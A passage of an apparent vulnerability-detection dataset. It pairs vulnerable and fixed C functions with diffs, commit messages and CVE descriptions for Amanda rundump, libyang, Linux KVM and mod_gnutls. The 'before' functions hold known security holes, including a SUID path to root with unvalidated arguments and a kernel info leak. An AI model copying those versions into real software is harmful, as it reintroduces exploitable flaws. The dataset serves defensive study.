GPtrArray *VAR_7 = g_ptr_array_new();
gchar **VAR_8;
char  **VAR_9;
#endif 
glib_init();
if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
printf(""rundump-%s\n"", VAR_10);
return (0);
}
setlocale(VAR_11, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""rundump"");
signal(VAR_12, VAR_13);
dbopen(VAR_14);
config_init(VAR_15|VAR_16, NULL);
if (VAR_0 < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VAR_10);
#ifdef VAR_2
g_fprintf(VAR_17, VAR_2);
dbprintf(""%s: %s"", VAR_1[0], VAR_2);
dbclose();
return 1;
#else
#ifdef VAR_18
check_running_as(VAR_19 | VAR_20);
if (!become_root()) {
error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(VAR_19);
#endif
VAR_0--;
VAR_1++;
dbprintf(_(""config: %s\n""), VAR_1[0]);
if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
dbrename(VAR_1[0], VAR_14);
VAR_0--;
VAR_1++;
#ifdef VAR_21
if (g_str_equal(VAR_1[0], ""xfsdump""))
VAR_3 = VAR_21;
else 
#endif
#ifdef VAR_22
if (g_str_equal(VAR_1[0], ""vxdump""))
VAR_3 = VAR_22;
else 
#endif
#ifdef VAR_23
if (g_str_equal(VAR_1[0], ""vdump""))
VAR_3 = VAR_23;
else 
#endif
#if defined(VAR_24)
VAR_3 = VAR_24;
#else
# if defined(VAR_21)
VAR_3 = VAR_21;
# else
#  if defined(VAR_22)
VAR_3 = VAR_22;
#  else
VAR_3 = ""dump"";
#  endif
# endif
#endif
g_ptr_array_add(VAR_7, g_strdup(VAR_3));
for (VAR_4 = 1; VAR_1[VAR_4]; VAR_4++)
g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_4]));
g_ptr_array_add(VAR_7, NULL);
VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);
VAR_6 = g_strjoinv("" "", VAR_8);
g_strfreev(VAR_8);
dbprintf(_(""running: %s\n""), VAR_6);
amfree(VAR_6);
VAR_9 = safe_env();
execve(VAR_3, VAR_1, VAR_9);
free_env(VAR_9);
VAR_5 = strerror(VAR_25);
dbprintf(_(""failed (%s)\n""), VAR_5);
dbclose();
g_fprintf(VAR_17, _(""rundump: could not exec %s: %s\n""), VAR_3, VAR_5);
return 1;
#endif
}",zmanda/amanda/e890d08e16ea0621966a7ae35cce53ccb44a472e/rundump.c/vul/before/0.json,"int
main(
    int		argc,
    char **	argv)
{
#ifndef ERRMSG
    char *dump_program;
    int i;
    char *e;
    char *cmdline;
    GPtrArray *array = g_ptr_array_new();
    gchar **strings;
    char  **env;
#endif /* ERRMSG */

    glib_init();

    if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
	printf(""rundump-%s\n"", VERSION);
	return (0);
    }

    /*
     * Configure program for internationalization:
     *   1) Only set the message locale for now.
     *   2) Set textdomain for all amanda related programs to ""amanda""
     *      We don't want to be forced to support dozens of message catalogs.
     */  
    setlocale(LC_MESSAGES, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""rundump"");

    /* Don't die when child closes pipe */
    signal(SIGPIPE, SIG_IGN);

    dbopen(DBG_SUBDIR_CLIENT);
    config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);

    if (argc < 3) {
	error(_(""Need at least 3 arguments\n""));
	/*NOTREACHED*/
    }

    dbprintf(_(""version %s\n""), VERSION);

#ifdef ERRMSG							/* { */

    g_fprintf(stderr, ERRMSG);
    dbprintf(""%s: %s"", argv[0], ERRMSG);
    dbclose();
    return 1;

#else								/* } { */

#ifdef WANT_SETUID_CLIENT
    check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
    if (!become_root()) {
	error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/*NOTREACHED*/
    }
#else
    check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif

    /* skip argv[0] */
    argc--;
    argv++;

    dbprintf(_(""config: %s\n""), argv[0]);
    if (!g_str_equal(argv[0], ""NOCONFIG""))
	dbrename(argv[0], DBG_SUBDIR_CLIENT);
    argc--;
    argv++;

#ifdef XFSDUMP

    if (g_str_equal(argv[0], ""xfsdump""))
        dump_program = XFSDUMP;
    else /* strcmp(argv[0], ""xfsdump"") != 0 */

#endif

#ifdef VXDUMP

    if (g_str_equal(argv[0], ""vxdump""))
        dump_program = VXDUMP;
    else /* strcmp(argv[0], ""vxdump"") != 0 */

#endif

#ifdef VDUMP

    if (g_str_equal(argv[0], ""vdump""))
	dump_program = VDUMP;
    else /* strcmp(argv[0], ""vdump"") != 0 */

#endif

#if defined(DUMP)
        dump_program = DUMP;
        validate_dump_option(argc, argv);
#else
# if defined(XFSDUMP)
        dump_program = XFSDUMP;
        validate_xfsdump_options(argc, argv);
# else
#  if defined(VXDUMP)
	dump_program = VXDUMP;
#  else
        dump_program = ""dump"";
        validate_dump_option(argc, argv);
#  endif
# endif
#endif


    /*
     * Build the array
     */

    g_ptr_array_add(array, g_strdup(dump_program));

    for (i = 1; argv[i]; i++)
        g_ptr_array_add(array, quote_string(argv[i]));

    g_ptr_array_add(array, NULL);
    strings = (gchar **)g_ptr_array_free(array, FALSE);

    cmdline = g_strjoinv("" "", strings);
    g_strfreev(strings);

    dbprintf(_(""running: %s\n""), cmdline);
    amfree(cmdline);

    env = safe_env();
    execve(dump_program, argv, env);
    free_env(env);

    e = strerror(errno);
    dbprintf(_(""failed (%s)\n""), e);
    dbclose();

    g_fprintf(stderr, _(""rundump: could not exec %s: %s\n""), dump_program, e);
    return 1;
#endif								/* } */
}","int
main(
    int		VAR_0,
    char **	VAR_1)
{
#ifndef VAR_2
    char *VAR_3;
    int VAR_4;
    char *VAR_5;
    char *VAR_6;
    GPtrArray *VAR_7 = g_ptr_array_new();
    gchar **VAR_8;
    char  **VAR_9;
#endif /* COMMENT_0 */

    glib_init();

    if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
	printf(""rundump-%s\n"", VAR_10);
	return (0);
    }

    /* COMMENT_1 */
                                                  
                                                
                                                                      
                                                                             
         
    setlocale(VAR_11, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""rundump"");

    /* COMMENT_7 */
    signal(VAR_12, VAR_13);

    dbopen(VAR_14);
    config_init(VAR_15|VAR_16, NULL);

    if (VAR_0 < 3) {
	error(_(""Need at least 3 arguments\n""));
	/* COMMENT_8 */
    }

    dbprintf(_(""version %s\n""), VAR_10);

#ifdef VAR_2							/* COMMENT_9 */

    g_fprintf(VAR_17, VAR_2);
    dbprintf(""%s: %s"", VAR_1[0], VAR_2);
    dbclose();
    return 1;

#else								/* COMMENT_10 */

#ifdef VAR_18
    check_running_as(VAR_19 | VAR_20);
    if (!become_root()) {
	error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/* COMMENT_8 */
    }
#else
    check_running_as(VAR_19);
#endif

    /* COMMENT_11 */
    VAR_0--;
    VAR_1++;

    dbprintf(_(""config: %s\n""), VAR_1[0]);
    if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
	dbrename(VAR_1[0], VAR_14);
    VAR_0--;
    VAR_1++;

#ifdef VAR_21

    if (g_str_equal(VAR_1[0], ""xfsdump""))
        VAR_3 = VAR_21;
    else /* COMMENT_12 */

#endif

#ifdef VAR_22

    if (g_str_equal(VAR_1[0], ""vxdump""))
        VAR_3 = VAR_22;
    else /* COMMENT_13 */

#endif

#ifdef VAR_23

    if (g_str_equal(VAR_1[0], ""vdump""))
	VAR_3 = VAR_23;
    else /* COMMENT_14 */

#endif

#if defined(VAR_24)
        VAR_3 = VAR_24;
        validate_dump_option(VAR_0, VAR_1);
#else
# if defined(VAR_21)
        VAR_3 = VAR_21;
        validate_xfsdump_options(VAR_0, VAR_1);
# else
#  if defined(VAR_22)
	VAR_3 = VAR_22;
#  else
        VAR_3 = ""dump"";
        validate_dump_option(VAR_0, VAR_1);
#  endif
# endif
#endif


    /* COMMENT_15 */
                      
       

    g_ptr_array_add(VAR_7, g_strdup(VAR_3));

    for (VAR_4 = 1; VAR_1[VAR_4]; VAR_4++)
        g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_4]));

    g_ptr_array_add(VAR_7, NULL);
    VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);

    VAR_6 = g_strjoinv("" "", VAR_8);
    g_strfreev(VAR_8);

    dbprintf(_(""running: %s\n""), VAR_6);
    amfree(VAR_6);

    VAR_9 = safe_env();
    execve(VAR_3, VAR_1, VAR_9);
    free_env(VAR_9);

    VAR_5 = strerror(VAR_25);
    dbprintf(_(""failed (%s)\n""), VAR_5);
    dbclose();

    g_fprintf(VAR_17, _(""rundump: could not exec %s: %s\n""), VAR_3, VAR_5);
    return 1;
#endif								/* COMMENT_18 */
}",zmanda/amanda/e890d08e16ea0621966a7ae35cce53ccb44a472e/rundump.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -102,14 +102,17 @@
 
 #if defined(DUMP)
         dump_program = DUMP;
+        validate_dump_option(argc, argv);
 #else
 # if defined(XFSDUMP)
         dump_program = XFSDUMP;
+        validate_xfsdump_options(argc, argv);
 # else
 #  if defined(VXDUMP)
 	dump_program = VXDUMP;
 #  else
         dump_program = ""dump"";
+        validate_dump_option(argc, argv);
 #  endif
 # endif
 #endif","{'deleted_lines': [], 'added_lines': ['        validate_dump_option(argc, argv);', '        validate_xfsdump_options(argc, argv);', '        validate_dump_option(argc, argv);']}",True,"Amanda 3.5.1 allows privilege escalation from the regular user backup to root. The SUID binary located at /lib/amanda/rundump will execute /usr/sbin/dump as root with controlled arguments from the attacker which may lead to escalation of privileges, denial of service, and information disclosure.",6.7,MEDIUM,1,valid,2023-02-13T08:14:04Z,4
CVE-2023-26916,['CWE-476'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L,1,CESNET/libyang,"schema compile UPDATE do not implement 2 same modules

Refs #1979",dc668d296f9f05aeab6315d44cff3208641e3096,https://github.com/CESNET/libyang/commit/dc668d296f9f05aeab6315d44cff3208641e3096,src/schema_compile.c,lys_implement,"LY_ERR
lys_implement(struct lys_module *mod, const char **features, struct lys_glob_unres *unres)
{
LY_ERR ret;
struct lys_module *m;
assert(!mod->implemented);
m = ly_ctx_get_module_implemented(mod->ctx, mod->name);
if (m) {
assert(m != mod);
if (!strcmp(mod->name, ""yang"") && (strcmp(m->revision, mod->revision) > 0)) {
LOGVRB(""Internal module \""%s@%s\"" is already implemented in revision \""%s\"", using it instead."",
mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
} else {
LOGERR(mod->ctx, LY_EDENIED, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
return LY_EDENIED;
}
}
ret = lys_set_features(mod->parsed, features);
if (ret && (ret != LY_EEXIST)) {
return ret;
}
mod->implemented = 1;
mod->to_compile = 1;
LY_CHECK_RET(ly_set_add(&unres->implementing, mod, 1, NULL));
LY_CHECK_RET(lys_precompile_augments_deviations(mod, unres));
LY_CHECK_RET(lys_has_compiled_import_r(mod));
return LY_SUCCESS;
}","LY_ERR
lys_implement(struct lys_module *VAR_0, const char **VAR_1, struct lys_glob_unres *VAR_2)
{
LY_ERR VAR_3;
struct lys_module *VAR_4;
assert(!VAR_0->implemented);
VAR_4 = ly_ctx_get_module_implemented(VAR_0->ctx, VAR_0->name);
if (VAR_4) {
assert(VAR_4 != VAR_0);
if (!strcmp(VAR_0->name, ""yang"") && (strcmp(VAR_4->revision, VAR_0->revision) > 0)) {
LOGVRB(""Internal module \""%s@%s\"" is already implemented in revision \""%s\"", using it instead."",
VAR_0->name, VAR_0->revision ? VAR_0->revision : ""<none>"", VAR_4->revision ? VAR_4->revision : ""<none>"");
} else {
LOGERR(VAR_0->ctx, VAR_5, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
VAR_0->name, VAR_0->revision ? VAR_0->revision : ""<none>"", VAR_4->revision ? VAR_4->revision : ""<none>"");
return VAR_5;
}
}
VAR_3 = lys_set_features(VAR_0->parsed, VAR_1);
if (VAR_3 && (VAR_3 != VAR_6)) {
return VAR_3;
}
VAR_0->implemented = 1;
VAR_0->to_compile = 1;
LY_CHECK_RET(ly_set_add(&VAR_2->implementing, VAR_0, 1, NULL));
LY_CHECK_RET(lys_precompile_augments_deviations(VAR_0, VAR_2));
LY_CHECK_RET(lys_has_compiled_import_r(VAR_0));
return VAR_7;
}",CESNET/libyang/dc668d296f9f05aeab6315d44cff3208641e3096/schema_compile.c/vul/before/0.json,"LY_ERR
lys_implement(struct lys_module *mod, const char **features, struct lys_glob_unres *unres)
{
    LY_ERR r;
    struct lys_module *m;

    assert(!mod->implemented);

    /* check collision with other implemented revision */
    m = ly_ctx_get_module_implemented(mod->ctx, mod->name);
    if (m) {
        assert(m != mod);
        LOGERR(mod->ctx, LY_EDENIED, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
                mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
        return LY_EDENIED;
    }

    /* set features */
    r = lys_set_features(mod->parsed, features);
    if (r && (r != LY_EEXIST)) {
        return r;
    }

    /*
     * mark the module implemented, which means
     * 1) to (re)compile it only ::lys_compile() call is needed
     * 2) its compilation will never cause new modules to be implemented (::lys_compile() does not return ::LY_ERECOMPILE)
     *    but there can be some unres items added that do
     */
    mod->implemented = 1;

    /* this module is compiled in this compilation */
    mod->to_compile = 1;

    /* add the module into newly implemented module set */
    LY_CHECK_RET(ly_set_add(&unres->implementing, mod, 1, NULL));

    /* mark target modules with our augments and deviations */
    LY_CHECK_RET(lys_precompile_augments_deviations(mod, unres));

    /* check whether this module may reference any modules compiled previously */
    LY_CHECK_RET(lys_has_compiled_import_r(mod));

    return LY_SUCCESS;
}","LY_ERR
lys_implement(struct lys_module *VAR_0, const char **VAR_1, struct lys_glob_unres *VAR_2)
{
    LY_ERR VAR_3;
    struct lys_module *VAR_4;

    assert(!VAR_0->implemented);

    /* COMMENT_0 */
    VAR_4 = ly_ctx_get_module_implemented(VAR_0->ctx, VAR_0->name);
    if (VAR_4) {
        assert(VAR_4 != VAR_0);
        LOGERR(VAR_0->ctx, VAR_5, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
                VAR_0->name, VAR_0->revision ? VAR_0->revision : ""<none>"", VAR_4->revision ? VAR_4->revision : ""<none>"");
        return VAR_5;
    }

    /* COMMENT_1 */
    VAR_3 = lys_set_features(VAR_0->parsed, VAR_1);
    if (VAR_3 && (VAR_3 != VAR_6)) {
        return VAR_3;
    }

    /* COMMENT_2 */
                                               
                                                               
                                                                                                                          
                                                         
       
    VAR_0->implemented = 1;

    /* COMMENT_8 */
    VAR_0->to_compile = 1;

    /* COMMENT_9 */
    LY_CHECK_RET(ly_set_add(&VAR_2->implementing, VAR_0, 1, NULL));

    /* COMMENT_10 */
    LY_CHECK_RET(lys_precompile_augments_deviations(VAR_0, VAR_2));

    /* COMMENT_11 */
    LY_CHECK_RET(lys_has_compiled_import_r(VAR_0));

    return VAR_7;
}",CESNET/libyang/dc668d296f9f05aeab6315d44cff3208641e3096/schema_compile.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
 LY_ERR
 lys_implement(struct lys_module *mod, const char **features, struct lys_glob_unres *unres)
 {
-    LY_ERR ret;
+    LY_ERR r;
     struct lys_module *m;
 
     assert(!mod->implemented);
@@ -10,21 +10,15 @@
     m = ly_ctx_get_module_implemented(mod->ctx, mod->name);
     if (m) {
         assert(m != mod);
-        if (!strcmp(mod->name, ""yang"") && (strcmp(m->revision, mod->revision) > 0)) {
-            /* special case for newer internal module, continue */
-            LOGVRB(""Internal module \""%s@%s\"" is already implemented in revision \""%s\"", using it instead."",
-                    mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
-        } else {
-            LOGERR(mod->ctx, LY_EDENIED, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
-                    mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
-            return LY_EDENIED;
-        }
+        LOGERR(mod->ctx, LY_EDENIED, ""Module \""%s@%s\"" is already implemented in revision \""%s\""."",
+                mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");
+        return LY_EDENIED;
     }
 
     /* set features */
-    ret = lys_set_features(mod->parsed, features);
-    if (ret && (ret != LY_EEXIST)) {
-        return ret;
+    r = lys_set_features(mod->parsed, features);
+    if (r && (r != LY_EEXIST)) {
+        return r;
     }
 
     /*","{'deleted_lines': ['    LY_ERR ret;', '        if (!strcmp(mod->name, ""yang"") && (strcmp(m->revision, mod->revision) > 0)) {', '            /* special case for newer internal module, continue */', '            LOGVRB(""Internal module \\""%s@%s\\"" is already implemented in revision \\""%s\\"", using it instead."",', '                    mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");', '        } else {', '            LOGERR(mod->ctx, LY_EDENIED, ""Module \\""%s@%s\\"" is already implemented in revision \\""%s\\""."",', '                    mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");', '            return LY_EDENIED;', '        }', '    ret = lys_set_features(mod->parsed, features);', '    if (ret && (ret != LY_EEXIST)) {', '        return ret;'], 'added_lines': ['    LY_ERR r;', '        LOGERR(mod->ctx, LY_EDENIED, ""Module \\""%s@%s\\"" is already implemented in revision \\""%s\\""."",', '                mod->name, mod->revision ? mod->revision : ""<none>"", m->revision ? m->revision : ""<none>"");', '        return LY_EDENIED;', '    r = lys_set_features(mod->parsed, features);', '    if (r && (r != LY_EEXIST)) {', '        return r;']}",True,libyang from v2.0.164 to v2.1.30 was discovered to contain a NULL pointer dereference via the function lys_parse_mem at lys_parse_mem.c.,5.3,MEDIUM,1,valid,2023-02-13T09:23:13Z,4
CVE-2023-1513,['CWE-665'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N,1,torvalds/linux,"kvm: initialize all of the kvm_debugregs structure before sending it to userspace

When calling the KVM_GET_DEBUGREGS ioctl, on some configurations, there
might be some unitialized portions of the kvm_debugregs structure that
could be copied to userspace.  Prevent this as is done in the other kvm
ioctls, by setting the whole structure to 0 before copying anything into
it.

Bonus is that this reduces the lines of code as the explicit flag
setting and reserved space zeroing out can be removed.

Cc: Sean Christopherson <seanjc@google.com>
Cc: Paolo Bonzini <pbonzini@redhat.com>
Cc: Thomas Gleixner <tglx@linutronix.de>
Cc: Ingo Molnar <mingo@redhat.com>
Cc: Borislav Petkov <bp@alien8.de>
Cc: Dave Hansen <dave.hansen@linux.intel.com>
Cc: <x86@kernel.org>
Cc: ""H. Peter Anvin"" <hpa@zytor.com>
Cc: stable <stable@kernel.org>
Reported-by: Xingyuan Mo <hdthky0@gmail.com>
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
Message-Id: <20230214103304.3689213-1-gregkh@linuxfoundation.org>
Tested-by: Xingyuan Mo <hdthky0@gmail.com>
Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",2c10b61421a28e95a46ab489fd56c0f442ff6952,https://github.com/torvalds/linux/commit/2c10b61421a28e95a46ab489fd56c0f442ff6952,arch/x86/kvm/x86.c,kvm_vcpu_ioctl_x86_get_debugregs,"static void kvm_vcpu_ioctl_x86_get_debugregs(struct kvm_vcpu *vcpu,
struct kvm_debugregs *dbgregs)
{
unsigned long val;
memcpy(dbgregs->db, vcpu->arch.db, sizeof(vcpu->arch.db));
kvm_get_dr(vcpu, 6, &val);
dbgregs->dr6 = val;
dbgregs->dr7 = vcpu->arch.dr7;
dbgregs->flags = 0;
memset(&dbgregs->reserved, 0, sizeof(dbgregs->reserved));
}","static void kvm_vcpu_ioctl_x86_get_debugregs(struct kvm_vcpu *VAR_0,
struct kvm_debugregs *VAR_1)
{
unsigned long VAR_2;
memcpy(VAR_1->db, VAR_0->arch.db, sizeof(VAR_0->arch.db));
kvm_get_dr(VAR_0, 6, &VAR_2);
VAR_1->dr6 = VAR_2;
VAR_1->dr7 = VAR_0->arch.dr7;
VAR_1->flags = 0;
memset(&VAR_1->reserved, 0, sizeof(VAR_1->reserved));
}",torvalds/linux/2c10b61421a28e95a46ab489fd56c0f442ff6952/x86.c/vul/before/0.json,"static void kvm_vcpu_ioctl_x86_get_debugregs(struct kvm_vcpu *vcpu,
					     struct kvm_debugregs *dbgregs)
{
	unsigned long val;

	memset(dbgregs, 0, sizeof(*dbgregs));
	memcpy(dbgregs->db, vcpu->arch.db, sizeof(vcpu->arch.db));
	kvm_get_dr(vcpu, 6, &val);
	dbgregs->dr6 = val;
	dbgregs->dr7 = vcpu->arch.dr7;
}","static void kvm_vcpu_ioctl_x86_get_debugregs(struct kvm_vcpu *VAR_0,
					     struct kvm_debugregs *VAR_1)
{
	unsigned long VAR_2;

	memset(VAR_1, 0, sizeof(*VAR_1));
	memcpy(VAR_1->db, VAR_0->arch.db, sizeof(VAR_0->arch.db));
	kvm_get_dr(VAR_0, 6, &VAR_2);
	VAR_1->dr6 = VAR_2;
	VAR_1->dr7 = VAR_0->arch.dr7;
}",torvalds/linux/2c10b61421a28e95a46ab489fd56c0f442ff6952/x86.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,10 +3,9 @@
 {
 	unsigned long val;
 
+	memset(dbgregs, 0, sizeof(*dbgregs));
 	memcpy(dbgregs->db, vcpu->arch.db, sizeof(vcpu->arch.db));
 	kvm_get_dr(vcpu, 6, &val);
 	dbgregs->dr6 = val;
 	dbgregs->dr7 = vcpu->arch.dr7;
-	dbgregs->flags = 0;
-	memset(&dbgregs->reserved, 0, sizeof(dbgregs->reserved));
 }","{'deleted_lines': ['\tdbgregs->flags = 0;', '\tmemset(&dbgregs->reserved, 0, sizeof(dbgregs->reserved));'], 'added_lines': ['\tmemset(dbgregs, 0, sizeof(*dbgregs));']}",True,"A flaw was found in KVM. When calling the KVM_GET_DEBUGREGS ioctl, on 32-bit systems, there might be some uninitialized portions of the kvm_debugregs structure that could be copied to userspace, causing an information leak.",3.3,LOW,0,valid,2023-02-14T10:33:04Z,4
CVE-2023-25824,['CWE-835'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,airtower-luna/mod_gnutls,"Fix loop in blocking read on transport timeout

The loop was cased by an incorrect errno if the transport read in
mgs_transport_read() fails with an APR TIMEUP status, as happens when
mod_reqtimeout limits are exceeded. Setting the transport errno to
EGAIN meant that a blocking read would be retried endlessly, setting
ETIMEDOUT instead makes the read fail as it should.

The bug was introduced in commit 92cb0cca41af946055307e373b6ab6d76d34f356,
first release to include it was 0.9.0.

Many thanks to Flix Arreola Rodrguez for the detailed analysis [1]
on the Debian bug tracker!

[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=942737#25",d7eec4e598158ab6a98bf505354e84352f9715ec,https://github.com/airtower-luna/mod_gnutls/commit/d7eec4e598158ab6a98bf505354e84352f9715ec,src/gnutls_io.c,mgs_transport_read,"ssize_t mgs_transport_read(gnutls_transport_ptr_t ptr,
void *buffer, size_t len)
{
mgs_handle_t *ctxt = ptr;
apr_size_t in = len;
apr_read_type_e block = ctxt->input_block;
ctxt->input_rc = APR_SUCCESS;
if (!len || buffer == NULL)
{
return 0;
}
if (!ctxt->input_bb)
{
ctxt->input_rc = APR_EOF;
gnutls_transport_set_errno(ctxt->session, ECONNABORTED);
return -1;
}
if (APR_BRIGADE_EMPTY(ctxt->input_bb))
{
apr_status_t rc = ap_get_brigade(ctxt->input_filter->next,
ctxt->input_bb, AP_MODE_READBYTES,
ctxt->input_block, in);
if (APR_STATUS_IS_EAGAIN(rc) || APR_STATUS_IS_EINTR(rc)
|| (rc == APR_SUCCESS
&& APR_BRIGADE_EMPTY(ctxt->input_bb)))
{
ctxt->input_rc = (rc != APR_SUCCESS ? rc : APR_EINTR);
gnutls_transport_set_errno(ctxt->session,
EAI_APR_TO_RAW(ctxt->input_rc));
return -1;
}
if (ctxt->input_block == APR_BLOCK_READ
&& APR_STATUS_IS_TIMEUP(rc)
&& APR_BRIGADE_EMPTY(ctxt->input_bb))
{
ctxt->input_rc = rc;
gnutls_transport_set_errno(ctxt->session, EAGAIN);
return -1;
}
if (rc != APR_SUCCESS)
{
ap_log_cerror(APLOG_MARK, APLOG_INFO, rc, ctxt->c,
""%s: Unexpected error!"", __func__);
apr_brigade_cleanup(ctxt->input_bb);
ctxt->input_bb = NULL;
gnutls_transport_set_errno(ctxt->session, EIO);
return -1;
}
}
ctxt->input_rc = brigade_consume(ctxt->input_bb, block, buffer, &len);
if (ctxt->input_rc == APR_SUCCESS)
{
return (ssize_t) len;
}
if (APR_STATUS_IS_EAGAIN(ctxt->input_rc)
|| APR_STATUS_IS_EINTR(ctxt->input_rc))
{
if (len == 0)
{
gnutls_transport_set_errno(ctxt->session,
EAI_APR_TO_RAW(ctxt->input_rc));
return -1;
}
return (ssize_t) len;
}
apr_brigade_cleanup(ctxt->input_bb);
ctxt->input_bb = NULL;
if (APR_STATUS_IS_EOF(ctxt->input_rc) && len)
{
return (ssize_t) len;
}
gnutls_transport_set_errno(ctxt->session, EIO);
return -1;
}","ssize_t mgs_transport_read(gnutls_transport_ptr_t VAR_0,
void *VAR_1, size_t VAR_2)
{
mgs_handle_t *VAR_3 = VAR_0;
apr_size_t VAR_4 = VAR_2;
apr_read_type_e VAR_5 = VAR_3->input_block;
VAR_3->input_rc = VAR_6;
if (!VAR_2 || VAR_1 == NULL)
{
return 0;
}
if (!VAR_3->input_bb)
{
VAR_3->input_rc = VAR_7;
gnutls_transport_set_errno(VAR_3->session, VAR_8);
return -1;
}
if (APR_BRIGADE_EMPTY(VAR_3->input_bb))
{
apr_status_t VAR_9 = ap_get_brigade(VAR_3->input_filter->next,
VAR_3->input_bb, VAR_10,
VAR_3->input_block, VAR_4);
if (APR_STATUS_IS_EAGAIN(VAR_9) || APR_STATUS_IS_EINTR(VAR_9)
|| (VAR_9 == VAR_6
&& APR_BRIGADE_EMPTY(VAR_3->input_bb)))
{
VAR_3->input_rc = (VAR_9 != VAR_6 ? VAR_9 : VAR_11);
gnutls_transport_set_errno(VAR_3->session,
EAI_APR_TO_RAW(VAR_3->input_rc));
return -1;
}
if (VAR_3->input_block == VAR_12
&& APR_STATUS_IS_TIMEUP(VAR_9)
&& APR_BRIGADE_EMPTY(VAR_3->input_bb))
{
VAR_3->input_rc = VAR_9;
gnutls_transport_set_errno(VAR_3->session, VAR_13);
return -1;
}
if (VAR_9 != VAR_6)
{
ap_log_cerror(VAR_14, VAR_15, VAR_9, VAR_3->c,
""%s: Unexpected error!"", VAR_16);
apr_brigade_cleanup(VAR_3->input_bb);
VAR_3->input_bb = NULL;
gnutls_transport_set_errno(VAR_3->session, VAR_17);
return -1;
}
}
VAR_3->input_rc = brigade_consume(VAR_3->input_bb, VAR_5, VAR_1, &VAR_2);
if (VAR_3->input_rc == VAR_6)
{
return (ssize_t) VAR_2;
}
if (APR_STATUS_IS_EAGAIN(VAR_3->input_rc)
|| APR_STATUS_IS_EINTR(VAR_3->input_rc))
{
if (VAR_2 == 0)
{
gnutls_transport_set_errno(VAR_3->session,
EAI_APR_TO_RAW(VAR_3->input_rc));
return -1;
}
return (ssize_t) VAR_2;
}
apr_brigade_cleanup(VAR_3->input_bb);
VAR_3->input_bb = NULL;
if (APR_STATUS_IS_EOF(VAR_3->input_rc) && VAR_2)
{
return (ssize_t) VAR_2;
}
gnutls_transport_set_errno(VAR_3->session, VAR_17);
return -1;
}",airtower-luna/mod_gnutls/d7eec4e598158ab6a98bf505354e84352f9715ec/gnutls_io.c/vul/before/0.json,"ssize_t mgs_transport_read(gnutls_transport_ptr_t ptr,
                           void *buffer, size_t len)
{
    mgs_handle_t *ctxt = ptr;
    apr_size_t in = len;
    apr_read_type_e block = ctxt->input_block;

    ctxt->input_rc = APR_SUCCESS;

    /* If Len = 0, we don't do anything. */
    if (!len || buffer == NULL)
    {
        return 0;
    }
    /* Input bucket brigade is missing, EOF */
    if (!ctxt->input_bb)
    {
        ctxt->input_rc = APR_EOF;
        gnutls_transport_set_errno(ctxt->session, ECONNABORTED);
        return -1;
    }

    if (APR_BRIGADE_EMPTY(ctxt->input_bb))
    {
        apr_status_t rc = ap_get_brigade(ctxt->input_filter->next,
                                         ctxt->input_bb, AP_MODE_READBYTES,
                                         ctxt->input_block, in);

        /* Not a problem, there was simply no data ready yet.
         */
        if (APR_STATUS_IS_EAGAIN(rc) || APR_STATUS_IS_EINTR(rc)
            || (rc == APR_SUCCESS
                && APR_BRIGADE_EMPTY(ctxt->input_bb)))
        {
            /* Turning APR_SUCCESS into APR_EINTR isn't ideal, but
             * it's the best matching error code for ""didn't get data,
             * but read didn't permanently fail either."" */
            ctxt->input_rc = (rc != APR_SUCCESS ? rc : APR_EINTR);
            gnutls_transport_set_errno(ctxt->session,
                                       EAI_APR_TO_RAW(ctxt->input_rc));
            return -1;
        }

        /* Blocking ap_get_brigade() can return a timeout status,
         * sometimes after a very short time. ""Don't give up, just
         * return the timeout"" is what mod_ssl does. */
        if (ctxt->input_block == APR_BLOCK_READ
            && APR_STATUS_IS_TIMEUP(rc)
            && APR_BRIGADE_EMPTY(ctxt->input_bb))
        {
            ctxt->input_rc = rc;
